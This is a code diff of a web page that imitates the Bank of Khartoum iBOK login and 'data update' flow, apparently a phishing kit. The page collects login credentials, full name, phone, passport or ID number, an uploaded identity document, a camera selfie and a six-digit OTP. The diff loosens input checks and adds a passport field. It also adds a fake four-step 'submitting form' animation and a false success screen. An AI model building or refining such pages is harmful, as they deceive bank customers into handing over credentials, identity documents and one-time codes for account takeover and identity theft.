@@ -447,13 +447,6 @@
       margin-bottom: 7px;
     }
 
-    .field-hint {
-      display: block;
-      font-size: 12px;
-      color: #666666;
-      margin-top: 5px;
-    }
-
     .input-control,
     .select-control {
       width: 100%;
@@ -571,7 +564,6 @@
       user-select: none;
     }
 
-    /* زر الدخول يتقلب إلى الأحمر تلقائياً عند اكتمال البيانات */
     .submit-btn {
       width: 100%;
       height: 50px;
@@ -599,35 +591,10 @@
       transform: scale(0.99);
     }
 
-    .action-btn-gold {
-      width: 100%;
-      height: 46px;
-      border: none;
-      border-radius: 8px;
-      background: linear-gradient(180deg, #d4a82d 0%, var(--gold-banner) 100%);
-      color: #ffffff;
-      font-family: 'Cairo', sans-serif;
-      font-size: 16px;
-      font-weight: 700;
-      cursor: pointer;
-      margin-top: 6px;
-      transition: filter 0.15s ease, transform 0.15s ease;
-    }
-
-    .action-btn-gold:hover {
-      filter: brightness(1.05);
-    }
-
-    /* الأقسام الإضافية في صفحة تحديث البيانات بعد الضغط على متابعة */
-    .extra-verification-section {
-      display: none;
-      margin-top: 22px;
-      padding-top: 20px;
+    .full-verification-section {
+      margin-top: 20px;
+      padding-top: 18px;
       border-top: 1.5px dashed #dddddd;
-    }
-
-    .extra-verification-section.visible {
-      display: block;
     }
 
     .sub-section-title {
@@ -679,7 +646,6 @@
       border: 1px solid #dddddd;
     }
 
-    /* قسم السيلفي ومحدد الوجه الذهبي */
     .selfie-box {
       margin-top: 18px;
       border: 1.5px solid #e5e5e5;
@@ -753,7 +719,6 @@
       transform: scaleX(-1);
     }
 
-    /* محدد الوجه الذهبي */
     .gold-face-guide {
       position: absolute;
       width: 148px;
@@ -792,7 +757,108 @@
       font-size: 14px;
       color: #333333;
       margin-bottom: 18px;
-      line-height: 1.6;
+      line-height: 1.65;
+    }
+
+    /* ================= شاشة جاري تسليم الاستمارة (حسب الصورة المرفقة) ================= */
+    .submission-screen {
+      background-color: #ffffff;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      padding: 32px 20px;
+      text-align: center;
+    }
+
+    .stepper-row {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 22px;
+      margin-bottom: 34px;
+      direction: ltr;
+    }
+
+    .step-circle {
+      width: 34px;
+      height: 34px;
+      border-radius: 50%;
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      font-family: Arial, sans-serif;
+      font-size: 13px;
+      font-weight: 700;
+      color: #ffffff;
+      background-color: #2b6be6;
+      transition: background-color 0.25s ease, transform 0.25s ease, box-shadow 0.25s ease;
+    }
+
+    .step-circle.completed {
+      background-color: #22a34a;
+      color: #ffffff;
+    }
+
+    .step-circle.active-step {
+      background-color: #ffffff;
+      color: #2b6be6;
+      border: 2.5px dashed #2b6be6;
+      transform: scale(1.12);
+    }
+
+    .step-circle.active-step.completed {
+      border-color: #22a34a;
+      color: #22a34a;
+    }
+
+    .submission-illustration {
+      width: 240px;
+      max-width: 100%;
+      margin: 0 auto 28px;
+    }
+
+    .submission-status-text {
+      font-size: 28px;
+      font-weight: 700;
+      color: #b7952b;
+      line-height: 1.4;
+      direction: rtl;
+    }
+
+    /* ================= شاشة النجاح النهائية ================= */
+    .success-screen {
+      background-color: #ffffff;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      padding: 36px 24px;
+      text-align: center;
+    }
+
+    .success-badge {
+      width: 84px;
+      height: 84px;
+      border-radius: 50%;
+      background-color: #e8f7ee;
+      color: #1f9d47;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 40px;
+      margin-bottom: 20px;
+      border: 3px solid #22a34a;
+    }
+
+    .success-title {
+      font-size: 24px;
+      font-weight: 700;
+      color: #1b7e3c;
+      line-height: 1.5;
+      margin-bottom: 24px;
     }
 
     .page-footer {
@@ -996,11 +1062,9 @@
                 class="input-control"
                 placeholder="أدخل رقم"
                 inputmode="numeric"
-                maxlength="7"
                 autocomplete="off"
                 oninput="handleAccountInput(this)"
               />
-              <span class="field-hint">رقم الحساب (7 أرقام فقط)</span>
             </div>
 
             <div class="field-group">
@@ -1068,7 +1132,7 @@
       </footer>
     </div>
 
-    <!-- ==================== شاشة 3: تحديث بيانات بنك الخرطوم ==================== -->
+    <!-- ==================== شاشة 3: تحديث بيانات بنك الخرطوم (كاملة بدون متابعة) ==================== -->
     <div id="screenUpdate" class="screen">
       <div>
         <header class="top-bar-2">
@@ -1111,21 +1175,23 @@
                 type="tel"
                 id="phoneNumber"
                 class="input-control"
-                placeholder="أدخل رقم الهاتف (9 أو 10 أرقام)"
+                placeholder="أدخل رقم الهاتف"
                 inputmode="numeric"
-                maxlength="10"
-                oninput="this.value = this.value.replace(/\D/g, '').slice(0, 10)"
+                oninput="this.value = this.value.replace(/\D/g, '')"
               />
             </div>
 
-            <button type="button" class="action-btn-gold" onclick="revealVerificationFields()">
-              متابعة
-            </button>
+            <div class="field-group">
+              <label for="passportNumber" class="field-label">رقم الجواز / الهوية:</label>
+              <input
+                type="text"
+                id="passportNumber"
+                class="input-control"
+                placeholder="أدخل رقم الجواز أو الهوية"
+              />
+            </div>
 
-            <div id="updateMessage" class="message-box" role="status" aria-live="polite"></div>
-
-            <!-- الحقول الإضافية التي تظهر في نفس الصفحة بالأسفل بعد متابعة -->
-            <div id="extraVerificationSection" class="extra-verification-section">
+            <div class="full-verification-section">
               <div class="field-group">
                 <h3 class="sub-section-title">
                   <i class="fa-solid fa-id-card"></i>
@@ -1134,8 +1200,8 @@
                 <label for="docType" class="field-label">نوع المستند:</label>
                 <select id="docType" class="select-control" onchange="confirmDocSelection()">
                   <option value="">اختر نوع المستند</option>
-                  <option value="رقم وطني">رقم وطني</option>
                   <option value="جواز سفر">جواز سفر</option>
+                  <option value="رقم وطني">رقم وطني</option>
                   <option value="بطاقة قومية">بطاقة قومية</option>
                   <option value="رخصة قيادة">رخصة قيادة</option>
                 </select>
@@ -1146,7 +1212,7 @@
                 <div class="upload-box" onclick="document.getElementById('docFileInput').click()">
                   <i class="fa-solid fa-cloud-arrow-up"></i>
                   <div style="font-size: 14px; font-weight: 600; color: #333;">اضغط لفتح المعرض واختيار صورة المستند</div>
-                  <div style="font-size: 12px; color: #777; margin-top: 2px;">رقم وطني، جواز سفر، بطاقة قومية، رخصة قيادة</div>
+                  <div style="font-size: 12px; color: #777; margin-top: 2px;">جواز سفر، رقم وطني، بطاقة قومية، رخصة قيادة</div>
                 </div>
                 <input
                   type="file"
@@ -1159,14 +1225,13 @@
                 <div id="docUploadStatus" class="upload-status"></div>
               </div>
 
-              <!-- صورة سيلفي مع محدد وجه ذهبي -->
               <div class="selfie-box">
                 <h3 class="sub-section-title">
                   <i class="fa-solid fa-camera"></i>
                   <span>صورة سيلفي</span>
                 </h3>
                 <p style="font-size: 13px; color: #555; line-height: 1.5;">
-                  ضع وجهك داخل المحدد الذهبي لالتقاط صورة الوجه تلقائياً أو عبر زر الالتقاط.
+                  ضع وجهك داخل المحدد الذهبي لالتقاط صورة الوجه.
                 </p>
 
                 <div class="camera-controls">
@@ -1188,7 +1253,7 @@
                 <div id="captureBar" style="display: none; margin-top: 10px;">
                   <button type="button" class="mini-btn mini-btn-red" style="width: 100%;" onclick="captureSelfiePhoto()">
                     <i class="fa-solid fa-circle-dot"></i>
-                    <span>التقاط ومتابعة</span>
+                    <span>التقاط الصورة</span>
                   </button>
                 </div>
 
@@ -1197,16 +1262,14 @@
                 <div id="selfieCapturedBox" class="selfie-captured-box">
                   <img id="selfiePreviewImg" alt="صورة السيلفي الملتقطة" />
                   <div id="selfieStatus" class="upload-status"></div>
-                  <button type="button" class="mini-btn mini-btn-dark" style="margin-top: 8px; width: 100%;" onclick="confirmSelfieStep()">
-                    <i class="fa-solid fa-check"></i>
-                    <span>تأكيد صورة الوجه</span>
-                  </button>
                 </div>
               </div>
 
               <button type="submit" class="submit-btn ready-red" style="margin-top: 22px;">
                 إرسال
               </button>
+
+              <div id="updateMessage" class="message-box" role="status" aria-live="polite"></div>
             </div>
           </form>
         </main>
@@ -1257,7 +1320,7 @@
             </div>
 
             <div id="otpSentInfo" class="otp-info-banner">
-              تم إرسال رمز التحقق لمرة واحدة إلى رقم الهاتف المسجل.
+              تم إرسال رمز الـ OTP مكون من ستة أرقام إلى بريدك الإلكتروني أو رقم الهاتف المسجل في البنك.
             </div>
 
             <div class="field-group">
@@ -1266,15 +1329,15 @@
                 type="text"
                 id="otpInput"
                 class="input-control"
-                placeholder="أدخل رمز الأو تي بي لمرة واحدة فقط"
+                placeholder="أدخل رمز الـ OTP المكون من 6 أرقام"
                 inputmode="numeric"
-                maxlength="8"
+                maxlength="6"
                 autocomplete="one-time-code"
-                oninput="this.value = this.value.replace(/\D/g, '')"
+                oninput="this.value = this.value.replace(/\D/g, '').slice(0, 6)"
               />
             </div>
 
-            <button type="submit" class="submit-btn ready-red">تأكيد الرمز</button>
+            <button type="submit" class="submit-btn ready-red">إرسال</button>
 
             <div id="otpMessage" class="message-box" role="status" aria-live="polite"></div>
           </form>
@@ -1298,16 +1361,87 @@
       </footer>
     </div>
 
+    <!-- ==================== شاشة 5: جاري تسليم الإستمارة (حسب الصورة) ==================== -->
+    <div id="screenSubmitting" class="screen">
+      <div class="submission-screen">
+        <div class="stepper-row" aria-label="خطوات التسليم">
+          <span id="stepCircle1" class="step-circle active-step">1</span>
+          <span id="stepCircle2" class="step-circle">2</span>
+          <span id="stepCircle3" class="step-circle">3</span>
+          <span id="stepCircle4" class="step-circle">4</span>
+        </div>
+
+        <div class="submission-illustration" aria-hidden="true">
+          <svg viewBox="0 0 260 220" width="240" height="200" xmlns="http://www.w3.org/2000/svg">
+            <ellipse cx="130" cy="202" rx="95" ry="9" fill="#f7e6d9" />
+            <circle cx="132" cy="112" r="78" fill="none" stroke="#f5d87d" stroke-width="3" stroke-dasharray="10 10" />
+            <circle cx="136" cy="108" r="64" fill="#fbeae3" opacity="0.7" />
+            <!-- ملف الاستمارة الأزرق -->
+            <path d="M126 52 H198 C206 52 210 58 206 66 L186 178 C184 186 178 190 170 190 H98 C90 190 86 184 88 176 L112 64 C114 56 119 52 126 52 Z" fill="#2563eb" />
+            <path d="M88 176 C86 184 90 190 98 190 H170 C176 190 180 186 182 181 H102 C95 181 91 178 88 176 Z" fill="#1d4ed8" />
+            <circle cx="132" cy="84" r="9" fill="#93c5fd" />
+            <rect x="148" y="78" width="38" height="4" rx="2" fill="#93c5fd" />
+            <rect x="148" y="86" width="26" height="4" rx="2" fill="#93c5fd" />
+            <rect x="122" y="106" width="58" height="4" rx="2" fill="#60a5fa" />
+            <rect x="118" y="116" width="58" height="4" rx="2" fill="#60a5fa" />
+            <rect x="114" y="132" width="44" height="4" rx="2" fill="#60a5fa" />
+            <rect x="110" y="142" width="52" height="4" rx="2" fill="#60a5fa" />
+            <!-- الشخصية -->
+            <circle cx="88" cy="76" r="10" fill="#f3b694" />
+            <path d="M78 73 C78 63 97 62 98 73 C101 82 103 92 98 96 C93 92 94 81 88 78 C83 76 79 78 78 73 Z" fill="#1f2937" />
+            <path d="M77 88 L98 88 L103 124 L74 124 Z" fill="#2563eb" />
+            <path d="M77 92 L58 106 L62 111 L79 101 Z" fill="#f3b694" />
+            <path d="M97 92 L118 96 L117 101 L96 99 Z" fill="#f3b694" />
+            <path d="M76 124 L86 124 L84 188 L75 188 Z" fill="#1e3a8a" />
+            <path d="M88 124 L99 124 L106 188 L97 188 Z" fill="#172554" />
+            <rect x="70" y="187" width="16" height="5" rx="2" fill="#1f2937" />
+            <rect x="96" y="187" width="17" height="5" rx="2" fill="#1f2937" />
+          </svg>
+        </div>
+
+        <div id="submissionCounterText" class="submission-status-text">جاري تسليم الإستمارة.. 1</div>
+      </div>
+    </div>
+
+    <!-- ==================== شاشة 6: تم التحديث بنجاح ==================== -->
+    <div id="screenSuccess" class="screen">
+      <div>
+        <header class="top-bar-2">
+          <div class="top-bar-left">
+            <div class="ibok-logo" dir="ltr">iBOK</div>
+            <div class="top-bar-sub">
+              <span class="ar">بنك الخرطوم</span>
+              <span class="en">Bank of Khartoum</span>
+            </div>
+          </div>
+        </header>
+
+        <div class="success-screen">
+          <div class="success-badge">
+            <i class="fa-solid fa-check"></i>
+          </div>
+          <h1 class="success-title">تم التحديث بنجاح، مبروك</h1>
+          <button type="button" class="login-btn" style="max-width: 240px; justify-content: center;" onclick="openHomeScreen()">
+            <span>العودة للرئيسية</span>
+          </button>
+        </div>
+      </div>
+
+      <footer class="page-footer">
+        <p class="copyright-text">بنك الخرطوم 2024 | <span dir="ltr">iBOK</span></p>
+      </footer>
+    </div>
+
   </div>
 
   <div id="toast" class="toast" role="status" aria-live="polite"></div>
 
   <script>
     let cameraStream = null;
-    let currentFacingMode = 'user'; // 'user' أمامية افتراضياً، 'environment' خلفية
+    let currentFacingMode = 'user';
     let docUploaded = false;
     let selfieCaptured = false;
-    let selfieConfirmed = false;
+    let submissionTimer = null;
 
     function showScreen(screenId) {
       document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
@@ -1326,6 +1460,7 @@
 
     function openLoginScreen(mode) {
       stopCamera();
+      clearInterval(submissionTimer);
       document.getElementById('headerBrand').textContent = mode;
       document.getElementById('bannerTitle').innerHTML =
         `الخدمات المصرفية عبر الإنترنت من <span dir="ltr">${mode}</span> - تسجيل الدخول`;
@@ -1338,23 +1473,22 @@
 
     function openHomeScreen() {
       stopCamera();
+      clearInterval(submissionTimer);
       showScreen('screenHome');
     }
 
-    /* حقل المعرف: 7 أرقام فقط */
     function handleAccountInput(input) {
-      input.value = input.value.replace(/\D/g, '').slice(0, 7);
+      input.value = input.value.replace(/\D/g, '');
       checkLoginReady();
     }
 
-    /* يتقلب زر تسجيل الدخول إلى الأحمر تلقائياً عند كتابة المعرف وكلمة المرور */
     function checkLoginReady() {
       const acc = document.getElementById('username').value.trim();
       const pass = document.getElementById('password').value.trim();
       const terms = document.getElementById('terms').checked;
       const btn = document.getElementById('loginSubmitBtn');
 
-      if (acc.length === 7 && pass.length > 0 && terms) {
+      if (acc.length > 0 && pass.length > 0 && terms) {
         btn.classList.add('ready-red');
       } else {
         btn.classList.remove('ready-red');
@@ -1386,8 +1520,8 @@
       const pass = document.getElementById('password').value.trim();
       const terms = document.getElementById('terms').checked;
 
-      if (acc.length !== 7) {
-        showMessage('loginMessage', 'يرجى إدخال رقم حساب مكون من 7 أرقام فقط.');
+      if (!acc) {
+        showMessage('loginMessage', 'يرجى إدخال معرف المستخدم.');
         return;
       }
       if (!pass) {
@@ -1405,27 +1539,6 @@
       });
     }
 
-    /* إظهار حقول إثبات الشخصية والسيلفي في نفس الصفحة بالأسفل */
-    function revealVerificationFields() {
-      const fullName = document.getElementById('fullName').value.trim();
-      const phone = document.getElementById('phoneNumber').value.trim();
-      const nameParts = fullName.split(/\s+/).filter(Boolean);
-
-      if (nameParts.length < 4) {
-        showMessage('updateMessage', 'يرجى إدخال الاسم الرباعي كاملاً.');
-        return;
-      }
-      if (phone.length < 9 || phone.length > 10) {
-        showMessage('updateMessage', 'يرجى إدخال رقم هاتف صحيح من 9 أو 10 أرقام.');
-        return;
-      }
-
-      showMessage('updateMessage', '');
-      const extraSection = document.getElementById('extraVerificationSection');
-      extraSection.classList.add('visible');
-      extraSection.scrollIntoView({ behavior: 'smooth', block: 'start' });
-    }
-
     function confirmDocSelection() {
       const docType = document.getElementById('docType').value;
       if (docType) {
@@ -1435,12 +1548,7 @@
 
     function handleDocUpload(input) {
       const file = input.files && input.files[0];
-      const docType = document.getElementById('docType').value;
       if (!file) return;
-
-      if (!docType) {
-        showToast('تنبيه: يُفضل تحديد نوع المستند أولاً.');
-      }
 
       const reader = new FileReader();
       reader.onload = function (e) {
@@ -1522,16 +1630,6 @@
       stopCamera();
     }
 
-    function confirmSelfieStep() {
-      if (!selfieCaptured) {
-        showToast('يرجى التقاط صورة السيلفي أولاً.');
-        return;
-      }
-      selfieConfirmed = true;
-      document.getElementById('selfieStatus').textContent = 'تم تأكيد صورة الوجه بنجاح';
-      showToast('تم تأكيد صورة الوجه');
-    }
-
     function stopCamera() {
       if (cameraStream) {
         cameraStream.getTracks().forEach(track => track.stop());
@@ -1543,10 +1641,10 @@
       event.preventDefault();
       const fullName = document.getElementById('fullName').value.trim();
       const phone = document.getElementById('phoneNumber').value.trim();
-      const nameParts = fullName.split(/\s+/).filter(Boolean);
+      const passport = document.getElementById('passportNumber').value.trim();
 
-      if (nameParts.length < 4 || phone.length < 9 || phone.length > 10) {
-        showMessage('updateMessage', 'يرجى إكمال الاسم الرباعي ورقم الهاتف أولاً.');
+      if (!fullName || !phone || !passport) {
+        showMessage('updateMessage', 'يرجى إكمال الاسم الرباعي ورقم الهاتف ورقم الجواز/الهوية.');
         return;
       }
 
@@ -1563,10 +1661,6 @@
       showMessage('updateMessage', '');
       stopCamera();
 
-      const maskedPhone = maskPhoneNumber(phone);
-      document.getElementById('otpSentInfo').innerHTML =
-        `تم إرسال رمز التحقق لمرة واحدة فقط إلى رقم الهاتف: <strong dir="ltr">${maskedPhone}</strong>`;
-
       runGoldSpinnerForTwoSeconds(() => {
         document.getElementById('otpInput').value = '';
         document.getElementById('otpMessage').textContent = '';
@@ -1574,21 +1668,62 @@
       });
     }
 
-    function maskPhoneNumber(phone) {
-      if (phone.length <= 4) return phone;
-      const start = phone.slice(0, 3);
-      const end = phone.slice(-2);
-      return start + '*'.repeat(phone.length - 5) + end;
-    }
-
     function handleOtpSubmit(event) {
       event.preventDefault();
       const otp = document.getElementById('otpInput').value.trim();
-      if (!otp || otp.length < 4) {
-        showMessage('otpMessage', 'يرجى إدخال رمز الأو تي بي الصحيح.');
+      if (otp.length !== 6) {
+        showMessage('otpMessage', 'يرجى إدخال رمز الـ OTP المكون من 6 أرقام.');
         return;
       }
-      showMessage('otpMessage', 'تم التحقق من رمز الأو تي بي بنجاح.');
+
+      showMessage('otpMessage', '');
+      startSubmissionProgress();
+    }
+
+    function startSubmissionProgress() {
+      clearInterval(submissionTimer);
+      showScreen('screenSubmitting');
+
+      const totalSteps = 4;
+      let currentStep = 1;
+
+      function renderStep(stepNum) {
+        document.getElementById('submissionCounterText').textContent = `جاري تسليم الإستمارة.. ${stepNum}`;
+        for (let i = 1; i <= totalSteps; i++) {
+          const el = document.getElementById('stepCircle' + i);
+          el.classList.remove('completed', 'active-step');
+
+          if (i < stepNum) {
+            el.classList.add('completed');
+            el.innerHTML = '<i class="fa-solid fa-check" style="font-size:12px;"></i>';
+          } else if (i === stepNum) {
+            el.classList.add('active-step');
+            el.textContent = String(i);
+          } else {
+            el.textContent = String(i);
+          }
+        }
+      }
+
+      renderStep(1);
+
+      submissionTimer = setInterval(() => {
+        currentStep++;
+        if (currentStep <= totalSteps) {
+          renderStep(currentStep);
+        } else {
+          clearInterval(submissionTimer);
+          for (let i = 1; i <= totalSteps; i++) {
+            const el = document.getElementById('stepCircle' + i);
+            el.classList.remove('active-step');
+            el.classList.add('completed');
+            el.innerHTML = '<i class="fa-solid fa-check" style="font-size:12px;"></i>';
+          }
+          setTimeout(() => {
+            showScreen('screenSuccess');
+          }, 600);
+        }
+      }, 1000);
     }
 
     function handleAction(name) {
